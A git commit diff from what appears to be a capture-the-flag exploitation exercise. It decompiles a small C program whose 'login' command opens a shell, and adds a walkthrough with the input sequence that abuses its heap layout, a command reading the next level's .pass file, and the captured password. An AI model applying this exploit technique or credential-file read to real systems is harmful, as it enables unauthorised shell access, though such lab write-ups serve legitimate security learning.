5b5627a65407b9c476f3a98a8ae20de70d628cd9
Charles-Elie Hervy <75300601+chervys@users.noreply.github.com>
2024-04-25 14:30:03 +0200

    Up level8

--- level8/source.c
+++ level8/source.c
@@ -1,132 +1,32 @@
-undefined4 main(void)
-{
-    char cVar1;
-    char *pcVar2;
-    int iVar3;
-    uint uVar4;
-    byte *pbVar5;
-    byte *pbVar6;
-    bool bVar7;
-    undefined uVar8;
-    undefined uVar9;
-    bool bVar10;
-    undefined uVar11;
-    byte bVar12;
-    byte local_90[5];
-    char local_8b[2];
-    char acStack_89[125];
+char* auth; // idb
+int service; // weak
 
-    bVar12 = 0;
-    do
-    {
-        printf("%p, %p \n", auth, service);
-        pcVar2 = fgets((char *)local_90, 0x80, stdin);
-        bVar7 = false;
-        bVar10 = pcVar2 == (char *)0x0;
-        if (bVar10)
-        {
-            return 0;
+int __cdecl main(int argc, const char** argv, const char** envp)
+{
+    char s[5]; // [esp+20h] [ebp-88h] BYREF
+    char v5[2]; // [esp+25h] [ebp-83h] BYREF
+    char v6[129]; // [esp+27h] [ebp-81h] BYREF
+
+    while (1) {
+        printf("%p, %p \n", auth, (const void*)service);
+        if (!fgets(s, 128, stdin))
+            break;
+        if (!memcmp(s, "auth ", 5u)) {
+            auth = (char*)malloc(4u);
+            *(_DWORD*)auth = 0;
+            if (strlen(v5) <= 0x1E)
+                strcpy(auth, v5);
         }
-        iVar3 = 5;
-        pbVar5 = local_90;
-        pbVar6 = (byte *)"auth ";
-        do
-        {
-            if (iVar3 == 0)
-                break;
-            iVar3 = iVar3 + -1;
-            bVar7 = *pbVar5 < *pbVar6;
-            bVar10 = *pbVar5 == *pbVar6;
-            pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
-            pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
-        } while (bVar10);
-        uVar8 = 0;
-        uVar11 = (!bVar7 && !bVar10) == bVar7;
-        if ((bool)uVar11)
-        {
-            auth = (undefined4 *)malloc(4);
-            *auth = 0;
-            uVar4 = 0xffffffff;
-            pcVar2 = local_8b;
-            do
-            {
-                if (uVar4 == 0)
-                    break;
-                uVar4 = uVar4 - 1;
-                cVar1 = *pcVar2;
-                pcVar2 = pcVar2 + (uint)bVar12 * -2 + 1;
-            } while (cVar1 != '\0');
-            uVar4 = ~uVar4 - 1;
-            uVar8 = uVar4 < 0x1e;
-            uVar11 = uVar4 == 0x1e;
-            if (uVar4 < 0x1f)
-            {
-                strcpy((char *)auth, local_8b);
-            }
-        }
-        iVar3 = 5;
-        pbVar5 = local_90;
-        pbVar6 = (byte *)"reset";
-        do
-        {
-            if (iVar3 == 0)
-                break;
-            iVar3 = iVar3 + -1;
-            uVar8 = *pbVar5 < *pbVar6;
-            uVar11 = *pbVar5 == *pbVar6;
-            pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
-            pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
-        } while ((bool)uVar11);
-        uVar9 = 0;
-        uVar8 = (!(bool)uVar8 && !(bool)uVar11) == (bool)uVar8;
-        if ((bool)uVar8)
-        {
+        if (!memcmp(s, "reset", 5u))
             free(auth);
-        }
-        iVar3 = 6;
-        pbVar5 = local_90;
-        pbVar6 = (byte *)"service";
-        do
-        {
-            if (iVar3 == 0)
-                break;
-            iVar3 = iVar3 + -1;
-            uVar9 = *pbVar5 < *pbVar6;
-            uVar8 = *pbVar5 == *pbVar6;
-            pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
-            pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
-        } while ((bool)uVar8);
-        uVar11 = 0;
-        uVar8 = (!(bool)uVar9 && !(bool)uVar8) == (bool)uVar9;
-        if ((bool)uVar8)
-        {
-            uVar11 = (byte *)0xfffffff8 < local_90;
-            uVar8 = acStack_89 == (char *)0x0;
-            service = strdup(acStack_89);
-        }
-        iVar3 = 5;
-        pbVar5 = local_90;
-        pbVar6 = (byte *)"login";
-        do
-        {
-            if (iVar3 == 0)
-                break;
-            iVar3 = iVar3 + -1;
-            uVar11 = *pbVar5 < *pbVar6;
-            uVar8 = *pbVar5 == *pbVar6;
-            pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
-            pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
-        } while ((bool)uVar8);
-        if ((!(bool)uVar11 && !(bool)uVar8) == (bool)uVar11)
-        {
-            if (auth[8] == 0)
-            {
-                fwrite("Password:\n", 1, 10, stdout);
-            }
-            else
-            {
+        if (!memcmp(s, "service", 6u))
+            service = (int)strdup(v6);
+        if (!memcmp(s, "login", 5u)) {
+            if (*((_DWORD*)auth + 8))
                 system("/bin/sh");
-            }
+            else
+                fwrite("Password:\n", 1u, 0xAu, stdout);
         }
-    } while (true);
+    }
+    return 0;
 }
---
+++ level8/walkthrough
@@ -0,0 +1,16 @@
+# level8
+
+```shell
+# python2.7 -c 'print("." * 32)'
+./level8
+auth .
+service ................................
+login
+```
+
+# flag
+
+```shell
+cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
